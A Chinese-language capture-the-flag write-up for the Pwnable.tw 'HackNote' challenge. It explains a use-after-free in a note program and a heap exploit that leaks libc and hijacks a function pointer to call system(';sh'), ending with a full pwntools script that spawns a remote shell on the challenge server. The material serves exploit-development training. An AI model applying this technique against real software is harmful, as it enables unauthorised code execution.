# [Pwnable.tw] HackNote 

## 程序逻辑

* add(content)

  在note中添加一个项，note的结构如下：

  ```
  | note[0] | note[1] | note[2] | ... | note[4] |
  	|
  	--> | hook_function ptr | content ptr | 
  								|
  								--> | content block |
  ```

* print_note(idx)

  指定一个项进行打印，打印会调用 *hook_function( note[idx] )

* delete(idx)

  删除一个项，即：

  ```c
  free(content_ptr);
  free(note[idx]);
  ```

  此处free后没有将指针置零，存在Use After Free

## 漏洞 & simple demostration

delete中free后没有将指针置零，free后的堆块若被其它note项申请，其它note项便可以控制已free的项的内容。

一个motivation example如下，申请一个note，设置content为`aaa`，随后delete；申请一个note，设置content为`bbb`；选择print第0个note，输出内容为`bbb`。此处，note[1]的ptr chunk为note[0]的ptr chunk，content chunk同样也是note[0]的content chunk。由于note[1]->content = bbbb，在选择print note[0]时，打印出的内容由aaaa变为bbbb。

```sh
➜  hacknote ./hacknote
----------------------
       HackNote
----------------------
 1. Add note
 2. Delete note
 3. Print note
 4. Exit
----------------------
Your choice :1
Note size :4
Content :aaaa
Success !
----------------------
       HackNote
----------------------
 1. Add note
 2. Delete note
 3. Print note
 4. Exit
----------------------
Your choice :2
Index :0
Success
----------------------
       HackNote
----------------------
 1. Add note
 2. Delete note
 3. Print note
 4. Exit
----------------------
Your choice :1
Note size :4
Content :bbbb
Success !
----------------------
       HackNote
----------------------
 1. Add note
 2. Delete note
 3. Print note
 4. Exit
----------------------
Your choice :3
Index :0
bbbb
```



## exploitation

### 攻击方式

example中控制的是`note[0]->content_chunk`，是否可以控制`note[0]->ptr_chunk`？或者说，是否可以使得`note[i]->content_ptr == note[0]->ptr_chunk `？

在example中，能够使得`note[1]->ptr_chunk == note[0]->ptr_chunk`，是因为free后的chunk位于fastbin[0]上，再申请时会从fastbin[0]中重新取出该chunk。如果我们设置`note[1]->content_size = 8`，我们是否能获得`note[0]->ptr_chunk` ？由于example中fastbin[0]上只有一个chunk，并且申请`note[1]->content`的顺序晚于`note[1]->ptr_chunk`，因此在上面的example中这是不可行的。

但是进一步地，如果我们能够使得fastbin[0]上有两个ptr_chunk呢？即做到`fastbin[0] ---> note[0]->ptr_chunk ---> note[1]->ptr_chunk`，这是容易的，只需要`add(size=0x10)`两次，再`delete(idx=0,idx=1)`即可。接下来再`add(size=8)`，就能够使得`note[2]->content == note[0]->ptr_chunk`。

控制了ptr_chunk之后，第一个想法是通过更改`note[0]->ptr_chunk->hook_func`来劫持控制流，从程序逻辑中我们知道，`print_note(idx=0)`实际上会调用`*(note[0]->ptr_chunk->hook_funk)(note[0])`，如果`*note[0] == "/bin/sh"`，并且`ptr_chunk == system`，那么我们就可以调用`system("/bin/sh")`。这个想法是行不通的，因为`*note[0] == |hook_func|content_ptr|`，如果我们希望`hook_func == system`，就不可能有`*note[0]=="/bin/sh"`。然而这个想法的方向是正确的，因为`system("xxx;sh")`也能够调用shell，因此我们只要修改`content_ptr = ";sh\x00"`，即可通过system调用sh。

在写入system之前，我们还需要获得libc加载的基地址。再回过头看`*hook_ptr(note[0])`，如果我们不变动`hook_ptr`，但是令`content_ptr = GOT["puts"]`，就可以通过print_note打印出puts的地址，从而达到泄露libc基地址的目的。

因此整个攻击流程已经明确了：

- 控制`note[0]->ptr_chunk`
  - `add(size=0x10) X 2` 
  - `delete(idx=0,idx=1)`
- 泄露libc基地址
  - `add(size=8，content=|print_note_func|GOT["puts"]| )`
  - `print_note(idx=0)`
- 更改hook_funk为system，content_ptr为`";sh\x00"`
  - `delete(idx=2)`
  - `add(size=8. content= |system_address|;sh\x00| )`
- getshell
  - print_note(idx=0)

脚本如下：

```python
# !/bin/python3
from pwn import *

context.arch = 'i386'
context.terminal = ['tmux','splitw','-h']

def choice(io, choi):
    io.recvuntil(b"Your choice :")
    io.sendline(f"{choi}".encode())

def add(io,size,content):
    choice(io,1)
    io.recvuntil(b"Note size :")
    io.sendline(f"{size}".encode())
    io.recvuntil(b"Content :")
    io.send(content)
    io.recvuntil(b"Success !")

def delete(io,idx):
    choice(io,2)
    io.recvuntil(b"Index :")
    io.sendline(f"{idx}".encode())
    # io.recvuntil(b"Success !")

def print_note(io,idx):
    choice(io,3)
    io.recvuntil(b"Index :")
    io.sendline(f"{idx}".encode())
    content = io.recvuntil(b"----------------------").strip(b"----------------------")
    return content

def leak_libc(io):
    choice()

def gdb_scripts(system_addr):
    scripts = f"set $system={system_addr}\n"
    scripts+= f"b *$system\n"
    scripts+= f"c"
    return scripts

DEBUG = False   

if __name__ == "__main__":
    if DEBUG:
        io = process("./hacknote")
    else:
        io = remote("chall.pwnable.tw",10102)
    _bin = ELF("./hacknote")
    libc = ELF("./libc_32.so.6")

    print_note_hook = 0x804862b
    puts_got = _bin.got['puts']

    # add 2 notes with size=0x10, idx=0,1, content: "/bin/sh\x00"
    # delete idx=0,idx=1
    # add 1 note with size = 0x8, idx=2, this note control the print_note_hook and content_ptr of note(idx=0) 
    # modified note(idx=2) content to | print_note_hook | GOT['puts'] |
    # print_note(idx=0), then the address of puts will leak, as well as libc
    # delete(idx=2), then bin->meta_chunk->content_chunk
    # add 1 note with size = 0x8, idx=3, this note control the print_note_hook and content_ptr of note(idx=3)
    # set idx=3' content to | system | ";sh\x00" |

    add(io,0x10,b"/bin/sh\x00")
    add(io,0x10,b"/bin/sh\x00")
    delete(io,0)
    delete(io,1)
    add(io,0x8,p32(print_note_hook) + p32(puts_got))
    # leak libc
    puts_addr = print_note(io,0)[:4]
    puts_addr = u32(puts_addr.ljust(4,b'\x00'))
    print("puts_addr: ", hex(puts_addr))
    libc.address = puts_addr - libc.symbols["puts"]
    print("leaked libc:",hex(libc.address))
    # hack
    delete(io,2)
    system_addr = libc.symbols["system"]
    gets_addr = libc.symbols["gets"]
    binsh = next(libc.search(b"/bin/sh\x00"))
    print("system at:",hex(system_addr))
    print("binsh at:",hex(binsh))

    #gdb.attach(pidof(io)[0],gdbscript=gdb_scripts(system_addr))
    #sleep(1)
    add(io,0x8,p32(system_addr)+b";sh\x00")
    #gdb.attach(pidof(io)[0],gdbscript=gdb_scripts(system_addr))
    # print(print_note(io,0))
    io.interactive()
```

